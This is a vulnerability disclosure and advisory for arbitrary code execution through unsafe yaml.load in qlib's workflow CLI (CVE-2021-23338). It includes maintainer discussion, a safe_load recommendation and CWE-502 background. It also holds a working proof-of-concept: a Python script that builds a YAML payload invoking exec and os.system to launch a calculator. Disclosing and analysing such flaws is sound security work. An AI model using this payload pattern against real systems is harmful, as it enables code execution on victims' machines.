# Description

**Arbitrary Code Excecution** in microsoft/qlib.

Qlib is an AI-oriented quantitative investment platform, which aims to realize the potential, empower the research, and create the value of AI technologies in quantitative investment.

# Technical Description

This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function **load()** in **yaml**

# Exploit code

**Python File**

```
import os
import qlib.workflow.cli as cli

exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('exploit.yml','w+').write(exploit)
cli.workflow('exploit.yml','workflow','/tmp')
os.system('rm exploit.yml')
```
# POC

* Install qlib using pip
* Run the exploit code

| [@B3EF](https://github.com/B3EF) this seems like an issue in a known vulnerable dependency of the project, rather than a vulnerability in the project itself. Closing for now, but please let me know if you feel differently. |

[@B3EF](https://github.com/B3EF) This is not an issue with the qlib but instead the dependency used in that project i.e pyyaml[[1](https://github.com/microsoft/qlib/blob/main/setup.py#L51)] & ruamel[[2](https://github.com/microsoft/qlib/blob/main/setup.py#L58)].

Also you can see that the exploit that you are passing is getting loaded by the `yaml` package [here](https://github.com/microsoft/qlib/blob/main/qlib/workflow/cli.py#L47).

So pyyaml is the real culprit behind this issue.

I think [@B3EF](https://github.com/B3EF) is right üòÑ

All the `deserialization bugs` occurs because the `deserializer` used allows, when user-input is supplied and not checked, to run malicious code. The `pyyaml` library for example allows to use the `safe_load` function which is better to handle `user input` of this type.

In this case the fault isn't of the `deserialization` library, which can handle every input with `load` but of the projects who's not using the `safe_load` alternative. It could be possible also restrict through a overriding class in case some `attributes` (malicious) need to be handled by the `qlib` library.

Cheers,

Mik

### Threat Intelligence

Exploit Maturity

Snyk has a proof-of-concept or detailed explanation of how to exploit this vulnerability.

Proof of conceptEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.
Check out the EPSS

[CVE-2021-23338 ¬†(opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2021-23338) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-502 ¬†(opens in a new tab)](https://cwe.mitre.org/data/definitions/502.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## Amendment

This was deemed not a vulnerability.

## Overview

[qlib](https://pypi.org/project/qlib) is an A Q Library for Data Scientist

Affected versions of this package are vulnerable to Deserialization of Untrusted Data. The workflow function in cli part of qlib was using an unsafe YAML load function.

## Details

Serialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like *Remote Method Invocation (RMI)*, *Java Management Extension (JMX)*, *Java Messaging System (JMS)*, *Action Message Format (AMF)*, *Java Server Faces (JSF) ViewState*, etc.

*Deserialization of untrusted data* ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.
